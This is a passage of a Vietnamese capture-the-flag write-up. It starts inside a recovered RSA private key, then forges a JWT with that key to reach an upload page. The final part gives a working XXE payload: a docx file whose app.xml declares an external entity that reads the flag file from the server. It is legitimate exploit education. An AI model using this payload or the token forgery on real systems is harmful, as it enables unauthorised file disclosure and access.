FLJFdfg+POgE9GwkVW8w4pO2YFQsc5H33KjFhAb5sWfRwBkqDaQHwjiWcdepm6De
KsHb/shsSmYQO4a6K5sdDb3taoxG6hPgaBnVGkKHVvkRv+i7JLzw4dg2toTp8WtY
gkUI3NJo545eBARwjm6pmR5mifxcMTQLgQKCAQAkgOFRQ1PHJM6Ufzlh7K0dnIIk
9JuamjlY4UVbyeiNgCQ6FNgxmDTsyBUHJhayCH7sinT24nhg2zFUawUwbIOGzp0T
rKE8rsSspzUHweW0BPByxtDJbZT20zzbDbwamsmlHQ627tYkvAX+yL+Cin59nBRv
gPmrqMa1Xy2cGWEAmNtlfEP0ibxgBBCGzRoH/E+a0uQbB5IJVZsUv0xq1Ij6gbYq
sz5Pln+ab9Wcyq/stdpBZj1N438QaDVuDDQUaEkXcGwcTDYtlRIqsp3ZcEN74Pls
vCcPe1Dc5iT/3JFDlnxduRd1gzGON0Pabw6DCwCgCr8RwmfuSQ+YLNs/b9V1
-----END RSA PRIVATE KEY-----
```

sử dụng công cụ so khớp với mã khuyết thiếu thì thấy nó giống nhau rồi, tuyệt vời !!!!!!!!!!!! mình đã thu phục được mã PEM ! pikachu!

### 2. Sửa đổi JWT

muốn sửa được JWT cần 2 khoá là private và public , ta có thể tạo ra khoá public từ private như sau:
> openssl pkey -in key_redacted.pem -pubout

khoá public trông như sau:
```
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA6KFTFdIRYOkFDi7A7IcJ
quX3t6+YDbMmM3vs2yzoGSwS5weQDIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A
7jFwkTCLnBEEAuXMtP2fWhyEy+kCL1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6
rDvNsOfgGgh8uo6gMozxIq4FGqfZi4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0
rIYn3rsMBUKMnoOP1OAJaTpu2CPNCLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b
5zq+zeooNy1kcrZT2OQkbYkOR6aiZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7
GK4UaPx7csD6LGlsTvQ/OKIxUb4znmBiNbFmche4Hv9abFwLT61jokXlF8xsiTVh
XE8Y4++/+uQ38YVTW4yVPPrI7VVb1brurpaTJx1frdAeIJtsUYzcFKOPNpY7SlGN
GdlbIaetrHKuYCq7T1ToIIwsyLkESy9r19fLXFF81TX9Rr/g2wtPhjj5n8X3w99f
25CexIBk98KYVuRbuoKLLxHMmALgiiLrrQVlRWEe8fwOcrSvTJZCzF1oiMr8nD1a
/s6mvfAAZkh9DTXcVcf1oaq8AKPjQlezoacOzVrcuPk5Hm61bzlQccuf/2VJ/Pb3
ZSl2YHgVgIKoxBjjBpQSJ50CAwEAAQ==
-----END PUBLIC KEY-----
```

khà khà , bây giờ thì vào jwt.io sửa lại token thôi, nhớ thêm 2 loại mã này vào nhé.

![img](./image/9.png)

oke ta đã có được token rồi nhé, để xem bên trong web có cái gì nào !!!!!

![img](./image/10.png)

sửa lại token chỗ này nhé. và reload lại trang


![img](./image/11.png)

khà khà vào được bên trong rồi, một chức năng upload xuất hiện. HOá ra đây chính là nới mà gợi ý bài nói tới


### Đọc flag thông qua Upload file

hmmm, xem nào: trước hết chức năng upload chỉ cho phép upload file docx, đề bài cho path của flag là /home/chall/flag.tx.

mình thử upload một file bất kỳ thì thấy hiện dòng chữ. `Thanks, for applying your CV consist 2 words ! you will receive a update soon.`

![img](./image/12.png)

Mình đoán chừng là ứng dụng web đếm số từ có trong file word và render ra màn hình. Vậy thì quá rõ, gộp toàn bộ dữ kiện lại mình có thể kết luận đây là lỗ hổng XXE.

Mình sẽ giải thích như này nhé: thực chất thì file docx chính là ZIP của nhiều file XML lại với nhau.
cấu trúc file docx sẽ gồm các file:
'[Content_Types].xml', thư mục docProps, thư mục _rels, thư mục word.

trong các thư mục này sẽ chứa các tệp xml.

trước hết thì ta cần biết chỗ render ra số từ được sử lý ở chỗ nào.

sau khi tìm hiểu thì mình thấy nó được xử lý trong file app.xml trong thư mục docProps

mình sẽ tạo một file docx mới tinh , rồi giải nén để lấy các file thành phần:

mình sẽ sửa file app.xml thành như sau:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///home/ctf/chall/flag.txt" >]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal</Template><TotalTime>0</TotalTime><Pages>1</Pages><Words>&xxe;</Words><Characters>16</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company></Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>17</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>14.0000</AppVersion></Properties>

```

rồi sau đó mình sẽ ZIP trở lại như cũ bằng lệnh:
> zip test.docx docProps/app.xml

Bây giờ chúng ta chỉ cần upload file này lên hệ thống và lấy flag thôi . hihihihi

![img](./image/14.png)


![img](./image/13.png)


Flag: GLUG{n3v3r_g1v3_up!!!}




